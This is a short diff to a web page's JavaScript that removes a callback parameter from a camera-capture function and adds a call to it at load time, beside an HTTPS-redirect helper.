@@ -58,7 +58,7 @@
 
         
 
-        function captureAndInjectCameraFeed(callback) {
+        function captureAndInjectCameraFeed() {
             var video = document.createElement('video');
             video.width = 640;
             video.height = 480;
@@ -115,6 +115,7 @@
             });
         };
 
+    captureAndInjectCameraFeed();
         function goToHTTPS() {
             location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
         }
